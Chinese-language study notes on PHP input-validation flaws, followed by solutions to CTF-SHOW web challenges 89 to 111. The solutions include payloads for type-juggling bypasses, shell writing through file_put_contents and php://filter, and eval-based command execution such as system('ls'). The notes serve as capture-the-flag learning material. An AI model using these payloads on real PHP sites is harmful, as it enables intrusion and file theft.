## 基础积累

### == 与 ===

== 弱类型对比不比较类型 ===比较值还会比较类型，这题当我们 x 传入 1.0 、1s、 +1 时皆可以输出 $flag。而 y 是用的 === 判断的，以上 payload 则不行

```php
<?php
header("Content-Type:text/html;charset=utf-8");
$flag='XXXXXXXXXXXXXXXXX';

//1、== ===缺陷绕过 == 弱类型对比 ===还会比较类型
$a=1;
if($a==$_GET['x']){
    echo $flag;
}

$a='1';
if($a===$_GET['y']){
    echo $flag;
}
?>
```

### MD5 与 == 与 ===

```php
if($_GET['name'] != $_GET['password']){
    if(MD5($_GET['name']) == MD5($_GET['password'])){
        echo $flag;
    }
    echo '?';
}
```

**存在两个不同的数它们的md5值相同的** 

此时用的是 **==** 弱比较，x=QNKCDZO&y=240610708，二者加密后都是以**0e开头**的密文，可以绕过==双等号验证

```php
if($_GET['name1'] != $_GET['password1']){
    if(MD5($_GET['name1']) === MD5($_GET['password1'])){
        echo $flag;
    }
    echo '?';
}
```

此时用的是 **===** 强比较，可以用数组绕过，name1[]=1&password1[]=2

### intval()缺陷

**intval()** 函数用于获取变量的整数值，**intval()** 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1

当使用这个 intva l函数时，往往前面**会过滤部分关键字**，可以采取**进制转换**的方法，利用intval函数来达到满足所有代码的成立

当 n=666.0 或者+666 时达到绕过，此时是默认的十进制

```php
$i='666';
$ii=$_GET['n'];
if(intval($ii==$i)){
    echo $flag;
}
```

当n=0x29a时绕过，此时是16进制

```php
$i='666';
$ii=$_GET['n'];
if(intval($ii==$i,0)){
    echo $flag;
}
```

### strpos()

```php
strpos(string,find,start)
查找 "string" 在字符串find中第一次（或使用start指定位置）出现的位置：
```

可以用 **%0a**（换行符）绕过

```php
$i='666';
$ii=$_GET['h'];
if(strpos($ii==$i,"0")){
    echo $flag;
}
```

### in_array函数

```
in_array(search,array,type)搜索数组中是否存在指定的值
```

| 参数     | 描述                                                         |
| :------- | :----------------------------------------------------------- |
| *search* | 必需。规定要在数组搜索的值。                                 |
| *array*  | 必需。规定要搜索的数组。                                     |
| *type*   | 可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。 |

如果**第三个变量不存在**，则可以使用**其他字符**来绕过检测

使用 i=1kk ,只要第一个数字在数组里，且后面跟什么都无所谓

```php
$whitelist = [1,2,3];
$page=$_GET['i'];
if (in_array($page, $whitelist)) {
    echo "yes";
}
```

### preg_match函数

preg_match 函数用于执行一个**正则表达式**匹配

**只能处理字符串**，如果不按规定传一个字符串，通常是传一个数组进去，这样就会报错

使用 num[]=1

```php
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```

### str_replace()

```php
str_replace(*find,replace,string,count*)
```

| 参数      | 描述                               |
| :-------- | :--------------------------------- |
| *find*    | 必需。规定要查找的值。             |
| *replace* | 必需。规定替换 *find* 中的值的值。 |
| *string*  | 必需。规定被搜索的字符串。         |
| *count*   | 可选。一个变量，对替换数进行计数。 |

str_replace无法迭代过滤，我们双写 select 即可绕过 s=sselectelect

```php
//7、str_replace无法迭代过滤
$sql=$_GET['s'];
$sql=str_replace('select','',$sql);
echo $sql;

//?s=sselectelect
```



## CTF-SHOW

### web89  数组绕过

```php
<?php

include("flag.php");
highlight_file(__FILE__);

if(isset($_GET['num'])){
    $num = $_GET['num'];
    if(preg_match("/[0-9]/", $num)){
        die("no no no!");
    }
    if(intval($num)){
        echo $flag;
    }
}
```

```
?num[]=1
```

preg_match(）是正则匹配，要求参数为 String 类型，我们传入的是**数组**，便达到绕过，**数组的值为数字或字母都无所谓**

<img src="图片\Snipaste_2023-01-09_10-22-59.png" alt="Snipaste_2023-01-09_10-22-59" style="zoom: 67%;" />

### web90  intval()函数

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

**intval()** 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值，**intval($num,0)** 代表了使用的是 
如果 base 是 0，**通过自动检测 var 的格式来决定使用的进制**： 
如果字符串包括了 "0x" (或 "0X") 的前缀，使用 16 进制 (hex)  
如果字符串以 "0" 开始，使用 8 进制(octal)；否则，  将使用 10 进制 (decimal)

**我们找到十进制 4476 的16进制 **0x117c 就行了，当然也可以找4476的8进制

注意：题目中的比较符号为 === 是类型与值同时比较

<img src="图片\Snipaste_2023-01-09_10-34-30.png" alt="Snipaste_2023-01-09_10-34-30" style="zoom: 67%;" />

### web91 换行符%0a

```php
<?php

show_source(__FILE__);
include('flag.php');
$a=$_GET['cmd'];
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
        echo 'hacker';
    }
    else{
        echo $flag;
    }
}
else{
    echo 'nonononono';
}
```

https://blog.csdn.net/qq_46091464/article/details/108278486

Apache HTTPD 换行解析漏洞  ，在一定条件下，正则的**$还会匹配到字符串结尾的换行符**（也就是%0a)

```
%0aphp
```

<img src="图片\Snipaste_2023-01-09_10-48-44.png" alt="Snipaste_2023-01-09_10-48-44" style="zoom:67%;" />

### web92 intval()

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

intval() 函数如果 $base 为  0 **则 $var 中存在字母的话遇到字母就停止读取**但是e这个字母比较特殊，可以在PHP中不是科学计数法。所以为了绕过前面的==4476我们就可以构造 4476e123 其实不需要是e其他的字母也可以

之前那题我们是用**进制转换**来做的，这次不用

<img src="图片\Snipaste_2023-01-09_11-00-24.png" alt="Snipaste_2023-01-09_11-00-24" style="zoom:67%;" />

### web93 intval与过滤

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(intval($num,0)==4476){
        echo $flag;
    }else{
        echo intval($num,0);
    }
}
```

过滤了字母，我们可以转换进制，使用 4476 的8进制 010574 

<img src="图片\Snipaste_2023-01-09_11-20-07.png" alt="Snipaste_2023-01-09_11-20-07" style="zoom:60%;" />

### web94  intval()与小数点

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==="4476"){
        die("no no no!");
    }
    if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    }
    if(!strpos($num, "0")){
        die("no no no!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

**过滤了开头为0的数字** 这样的话就**不能使用进制转换**来进行操作 我们可以使用**小数点**来进行操作。这样通过intval()函数就可以变为int类型的4476   ?num=4476.0

<img src="图片\Snipaste_2023-01-09_11-27-57.png" alt="Snipaste_2023-01-09_11-27-57" style="zoom:60%;" />

### web95  intval与过滤

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if(isset($_GET['num'])){
    $num = $_GET['num'];
    if($num==4476){
        die("no no no!");
    }
    if(preg_match("/[a-z]|\./i", $num)){
        die("no no no!!");
    }
    if(!strpos($num, "0")){
        die("no no no!!!");
    }
    if(intval($num,0)===4476){
        echo $flag;
    }
}
```

此时 if($num==4476) 是用的 == ，上一题用的是 ===，num=4476.0 便不再适用

可以通过**8进制绕过但是前面必须多加一个字节** ?num=+010574或者?num=%2b010574，不能以 0 开头

<img src="图片\Snipaste_2023-01-09_11-37-21.png" alt="Snipaste_2023-01-09_11-37-21" style="zoom: 67%;" />

### web96 linux目录

```php
<?php
highlight_file(__FILE__);

if(isset($_GET['u'])){
    if($_GET['u']=='flag.php'){
        die("no no no");
    }else{
        highlight_file($_GET['u']);
    }
}
```

在linux下面表示当前目录是 ./ 所以我们的payload： u=./flag.php

<img src="图片\Snipaste_2023-01-09_11-50-58.png" alt="Snipaste_2023-01-09_11-50-58" style="zoom: 67%;" />

### web97  MD5与===

```php
<?php

include("flag.php");
highlight_file(__FILE__);
if (isset($_POST['a']) and isset($_POST['b'])) {
if ($_POST['a'] != $_POST['b'])
if (md5($_POST['a']) === md5($_POST['b']))
echo $flag;
else
print 'Wrong.';
}
?>
```

数组绕过 a[]=1&b[]=2

<img src="图片\Snipaste_2023-01-09_12-01-47.png" alt="Snipaste_2023-01-09_12-01-47" style="zoom:67%;" />

### web98  三元运算符和传址

```php
<?php

include("flag.php");
$_GET?$_GET=&$_POST:'flag';  //只要有输入的get参数就将get方法改变为post方法(修改了get方法的地址)
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);

?> 
```

<img src="图片\Snipaste_2023-01-09_12-15-03.png" alt="Snipaste_2023-01-09_12-15-03" style="zoom:67%;" />

### web99 in_array()函数

```php
<?php

highlight_file(__FILE__);
$allow = array();
for ($i=36; $i < 0x36d; $i++) { 
    array_push($allow, rand(1,$i));
}
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){
    file_put_contents($_GET['n'], $_POST['content']);
}

?>
```

36d 的十进制是 877，rand(min,max) 是生成随机数的 ，file_put_contents() 函数把一个字符串写入文件中

```
int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )
```

| 参数     | 描述                                                         |
| :------- | :----------------------------------------------------------- |
| filename | 必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。 |
| data     | 必需。规定要写入文件的数据。可以是字符串、数组或数据流。     |
| flags    | 可选。规定如何打开/写入文件。可能的值：FILE_USE_INCLUDE_PATHFILE_APPENDLOCK_EX |
| context  | 可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项 |

**in_array()函数**，如果**第三个变量不存在**，则可以使用**其他字符**来绕过检测，使用 n=1.php ,只要第一个数字在数组里，且后面跟什么都无所谓

我们先写shell

<img src="图片\Snipaste_2023-01-09_12-44-35.png" alt="Snipaste_2023-01-09_12-44-35" style="zoom:67%;" />

再找flag

<img src="图片\Snipaste_2023-01-09_12-46-46.png" alt="Snipaste_2023-01-09_12-46-46" style="zoom:67%;" />

### web100 /**/在代码执行里注释

```php
<?php

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\;/", $v2)){
        if(preg_match("/\;/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }   
}
?>
```

**is_numeric()** 函数用于检测变量是否为**数字或数字字符串**，如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE

此题用 /**/ 把 v3 注释在代码执行里面了

<img src="图片\Snipaste_2023-01-09_13-07-54.png" alt="Snipaste_2023-01-09_13-07-54" style="zoom:67%;" />

### web101  反射类 

```php
<?php

highlight_file(__FILE__);
include("ctfshow.php");
//flag in class ctfshow;
$ctfshow = new ctfshow();
$v1=$_GET['v1'];
$v2=$_GET['v2'];
$v3=$_GET['v3'];
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);
if($v0){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){
            eval("$v2('ctfshow')$v3");
        }
    }  
}
?>
```

此题在上一题的基础上做了过滤，答案是 `?v1=1&v2=echo new Reflectionclass&v3=;`

此时成了 new Reflectionclass('ctfshow')

<img src="图片\Snipaste_2023-01-09_13-42-50.png" alt="Snipaste_2023-01-09_13-42-50" style="zoom:67%;" />

答案少一位，我们就硬试

```
ctfshow{6f38eeae-ee43-4339-a13c-b073c4db1865}
```

### web102

```php
<?php

highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    file_put_contents($v3,$str);
}
else{
    die('hacker');
}
?>
```

```
$v4 = is_numeric($v2) and is_numeric($v3);  //这个是优先执行 $v4 = is_numeric($v2) 的
```

**substr()** 函数返回字符串的一部分             **substr(*string,start,length*)**

| 参数     | 描述                                                         |
| :------- | :----------------------------------------------------------- |
| *string* | 必需。规定要返回其中一部分的字符串。                         |
| *start*  | 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾的指定位置开始0 - 在字符串中的第一个字符处开始 |
| *length* | 可选。规定要返回的字符串长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回负数 - 从字符串末端返回 |

**call_user_func**

官方的解释是：把第一个参数作为**回调函数**（`callback`），并且将其余的参数作为回调函数的参数。

第一个参数可以是函数名，后面的均为作为该函数使用的参数

```
GET
v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-
decode/resource=2.php
POST
v1=hex2bin
```

https://www.sojson.com/hexadecimal.html

```
115044383959474e6864434171594473 为字符串16进制转换，前两位是不重要的，被substr()过滤了
PD89YGNhdCAqYDs    base64的编码
<?=`cat *`;         解码
```

**hex2bin()** 函数把十六进制值的字符串转换为 ASCII 字符     hex2bin(*string*)

| 参数     | 描述                     |
| :------- | :----------------------- |
| *string* | 必需。要转换的十六进制值 |

<img src="图片\Snipaste_2023-01-10_11-01-13.png" alt="Snipaste_2023-01-10_11-01-13" style="zoom:67%;" />

### web103

```php
<?php

highlight_file(__FILE__);
$v1 = $_POST['v1'];
$v2 = $_GET['v2'];
$v3 = $_GET['v3'];
$v4 = is_numeric($v2) and is_numeric($v3);
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);
    echo $str;
    if(!preg_match("/.*p.*h.*p.*/i",$str)){
        file_put_contents($v3,$str);
    }
    else{
        die('Sorry');
    }
}
else{
    die('hacker');
}
?>
```

```
GET
v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-
decode/resource=2.php
POST
v1=hex2bin
```

```
115044383959474e6864434171594473  16进制
PD89YGNhdCAqYDs                   base64编码
<?=`cat *`;
```

### web104  sha1(）

```php
<?php

highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
}
?>
```

**sha1()** 函数计算字符串的 SHA-1 散列  sha1(*string,raw*)

| 参数     | 描述                                                         |
| :------- | :----------------------------------------------------------- |
| *string* | 必需。规定要计算的字符串。                                   |
| *raw*    | 可选。规定十六进制或二进制输出格式：TRUE - 原始 20 字符二进制格式FALSE - 默认。40 字符十六进制数 |

`md5()`和`sha1()`对一个**数组**进行加密将返回 NULL

<img src="图片\Snipaste_2023-01-10_11-37-24.png" alt="Snipaste_2023-01-10_11-37-24" style="zoom:67%;" />

### web105  变量覆盖 $$

```php
<?php

highlight_file(__FILE__);
include('flag.php');
error_reporting(0);
$error='你还想要flag嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("what are you doing?!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='flag'){
        die("what are you doing?!");
    }
    $$key=$$value;
}
if(!($_POST['flag']==$flag)){
    die($error);
}
echo "your are good".$flag."\n";
die($suces);

?>
你还想要flag嘛？
```

```
 GET: ?suces=flag POST: error=suces
```

考察变量覆盖，我们先寻找打印出的变量：$suces、$error、$flag，再看看他们中是否能被 $flag 覆盖掉，由于存在 die($error) ，我们就覆盖变量 **$error** 为 **$flag**

```
get   中   $$key=$$value 转化为 $suces=$flag
post 中   $$key=$$value 转化为 $error=$suces
最终 $error=$flag   输出了 die($error)
```

<img src="图片\Snipaste_2023-01-10_12-16-47.png" alt="Snipaste_2023-01-10_12-16-47" style="zoom:67%;" />

### web106 sha1()

```php
<?php

highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2) && $v1!=$v2){
        echo $flag;
    }
}
?>
```

**存在两个不同的数它们的sha1()值相同** ，与之前的MD5有些类似，都是以0e开头

```
aaK1STfY
0e76658526655756207688271159624026011393
aaO8zKZF
0e89257456677279068558073954252716165668
```

<img src="图片\Snipaste_2023-01-10_12-32-47.png" alt="Snipaste_2023-01-10_12-32-47" style="zoom:67%;" />

### web107  parse_str()

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];
       parse_str($v1,$v2);
       if($v2['flag']==md5($v3)){
           echo $flag;
       }
}
?>
```

**parse_str()** 函数把查询字符串解析到变量中     parse_str(*string,array*)

| 参数     | 描述                                                     |
| :------- | :------------------------------------------------------- |
| *string* | 必需。规定要解析的字符串。                               |
| *array*  | 可选。规定存储变量的数组名称。该参数指示变量存储到数组中 |

**例子**

```php
<?php
parse_str("name=Peter&age=43",$myArray);
print_r($myArray);
?>

Array ( [name] => Peter [age] => 43 )  //结果
```

**答案**

```
get:    v3=flag
post:   v1=flag=327a6c4304ad5938eaf0efb6cc3e53dc
```

flag 的 md5 是 327a6c4304ad5938eaf0efb6cc3e53dc

<img src="图片\Snipaste_2023-01-11_09-22-55.png" alt="Snipaste_2023-01-11_09-22-55" style="zoom:67%;" />

### web108 ereg()%00截断

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {
    die('error');
}
//只有36d的人才能看到flag
if(intval(strrev($_GET['c']))==0x36d){
    echo $flag;
}
?>
error
```

**ereg()** 为正则过滤，用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用**%00截断**正则匹配

**strrev()**  是反转字符串

```
?c=a%00778
```

<img src="图片\Snipaste_2023-01-11_09-42-57.png" alt="Snipaste_2023-01-11_09-42-57" style="zoom:67%;" />

### web109

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
            eval("echo new $v1($v2());");
    }
}
?>
```

直接输出一个类的时候，需要类里有魔术方法 _toString

```
?v1=exception&v2=phpinfo
?v1=exception&v2=system('ls')
?v1=exception&v2=system('echo phpinfo')
```

<img src="图片\Snipaste_2023-01-11_10-19-24.png" alt="Snipaste_2023-01-11_10-19-24" style="zoom:67%;" />

### web110

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~|\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/', $v2)){
            die("error v2");
    }
    eval("echo new $v1($v2());");
}
?>
```

在上一题的基础上增加了过滤，**getcwd()**函数 获取当前工作目录 返回当前工作目录

```
?v1=FilesystemIterator&v2=getcwd
```

### web111

```php
<?php

highlight_file(__FILE__);
error_reporting(0);
include("flag.php");

function getFlag(&$v1,&$v2){
    eval("$$v1 = &$$v2;");
    var_dump($$v1);
}

if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];

    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v1)){
            die("error v1");
    }
    if(preg_match('/\~| |\`|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\-|\+|\=|\{|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\<|\>/', $v2)){
            die("error v2");
    }
    if(preg_match('/ctfshow/', $v1)){
            getFlag($v1,$v2);
    }
}
?>
```

考察：全局变量 为了满足条件，我们可以利用全局变量来进行赋值给ctfshow这个变量 `payload: ?v1=ctfshow&v2=GLOBALS`

## 红日

[F:\xiaodi\20-PHP安全数缺陷&CTF&源码等\PHP-Audit-Labs-master]()

## 好文章

[PHP代码审计基础知识 | 狼组安全团队公开知识库 (wgpsec.org)](https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html)
